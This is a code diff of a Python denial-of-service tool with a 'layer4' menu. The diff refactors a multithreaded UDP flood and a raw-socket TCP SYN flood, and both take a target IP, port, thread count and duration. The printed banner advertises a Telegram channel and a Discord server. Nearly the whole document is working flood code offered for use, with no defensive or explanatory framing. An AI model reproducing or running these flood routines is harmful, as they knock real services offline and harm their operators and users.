@@ -43,33 +43,33 @@ def layer4():
         if select.startswith("udp"):
             parts = select.split()
             if len(parts) != 5:
-                print(f"usage{zoic}:{clear} {zoic}udp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}udp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                 input()
                 continue
 
-            _, ip, port, threads, duration = parts
+            _, ip, port, threads, secs = parts
             port = int(port)
             threads = int(threads)
-            duration = int(duration)
+            secs = int(secs)
 
-            def udp(ip, port, until_datetime):
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                target = (ip, port)
-                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
+            def udp_attack(host, port, secs):
+                end_time = time.time() + secs
+                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                while time.time() < end_time:
                     for data in payloads:
                         try:
-                            sock.sendto(data, target)
+                            s.sendto(data, (host, port))
                         except:
                             pass
-                sock.close()
+                s.close()
 
-            def th(ip, port, threads, duration):
-                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
+
+            def th(ip, port, threads, secs):
                 for _ in range(threads):
-                    t = threading.Thread(target=udp, args=(ip, port, until))
+                    t = threading.Thread(target=udp_attack, args=(ip, port, secs))
                     t.start()
 
-            th(ip, port, threads, duration)
+            th(ip, port, threads, secs)
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
 telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} discord.gg/KDzjfn63
@@ -93,32 +93,32 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
         elif select.startswith("tcp"):
             parts = select.split()
             if len(parts) != 5:
-                print(f"usage{zoic}:{clear} {zoic}tcp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}duration{clear}>")
+                print(f"usage{zoic}:{clear} {zoic}tcp{clear} <{zoic}ip{clear}> <{zoic}port{clear}> <{zoic}threads{clear}> <{zoic}secs{clear}>")
                 input()
                 continue
 
-            _, ip, port, threads, duration = parts
+            _, ip, port, threads, secs = parts
             port = int(port)
             threads = int(threads)
-            duration = int(duration)
+            secs = int(secs)
 
-            def syn(ip, port, until_datetime):
-                while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
-                    flags = 0b00000010
+            def tcp_attack(host, port, secs):
+                end_time = time.time() + secs
+                flags = 0b00000010
+                while time.time() < end_time:
                     try:
                         src_port = random.randint(1024, 65535)
                         pkt = struct.pack('!HHIIBBHHH', src_port, port, 0, 0, 80, flags, 8192, 0, 0)
-                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (ip, 0))
+                        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP).sendto(pkt, (host, 0))
                     except:
                         pass
 
-            def th(ip, port, threads, duration):
-                until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
+            def th(ip, port, threads, secs):
                 for _ in range(threads):
-                    t = threading.Thread(target=syn, args=(ip, port, until))
+                    t = threading.Thread(target=tcp_attack, args=(ip, port, secs))
                     t.start()
 
-            th(ip, port, threads, duration)
+            th(ip, port, threads, secs)
 
             os.system('cls' if os.name == 'nt' else 'clear')
             print(f"""
@@ -140,6 +140,7 @@ telegram {zoic}|{clear} t.me/cybermads {zoic}|{clear} Discord {zoic}|{clear} dis
 
 if __name__ == "__main__":
     layer4()
+
 
 
 
